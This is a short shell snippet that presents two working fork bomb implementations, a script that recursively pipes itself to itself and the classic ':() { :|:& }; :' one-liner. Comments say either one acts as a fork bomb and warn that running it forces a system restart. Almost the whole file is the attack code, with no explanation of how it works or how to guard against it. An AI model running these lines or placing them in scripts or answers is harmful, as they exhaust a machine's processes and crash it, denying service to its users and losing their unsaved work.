#shell script version of a fork bomb
#WARNING: DO NOT RUN THIS, will need a system restart
./$0|./$0&

#Another implementation of fork bomb
:() { :|:& }; :

#Either of the above 2 acts as fork bomb. 
